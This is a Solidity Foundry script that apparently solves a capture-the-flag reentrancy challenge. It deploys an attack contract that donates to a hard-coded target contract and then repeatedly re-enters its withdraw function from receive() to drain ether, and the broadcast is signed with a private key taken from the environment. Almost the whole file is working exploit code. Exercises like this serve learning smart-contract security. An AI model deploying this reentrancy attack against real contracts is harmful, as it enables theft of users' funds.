// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Reentrancy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract attackreentrancy{

    Reentrance public ReentranceInstance = Reentrance(payable(0x4a3A9E539CB5B196F062fA30F4938242E17c9Cd8));

    constructor() public payable {
     
     //Donate eth to ourself (0.001 ETH)
     ReentranceInstance.donate{value: 0.001 ether}(address(this));
   
    }
    
    function Withdraw() external {   
     //withdraw the same amount
    ReentranceInstance.withdraw(0.001 ether);
    (bool result,) = msg.sender.call{value: 0.002 ether}("");
    }
    

    receive() external payable {
     //Reenter and withdraw the same amount again and again (In Loop)
      ReentranceInstance.withdraw(0.001 ether);
    }

}


contract ReentrancySolution is Script {
 
    

    function run() external {

      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      attackreentrancy Attackreentrancy = new attackreentrancy{value: 0.001 ether}();
      Attackreentrancy.Withdraw();
      vm.stopBroadcast();
    }

}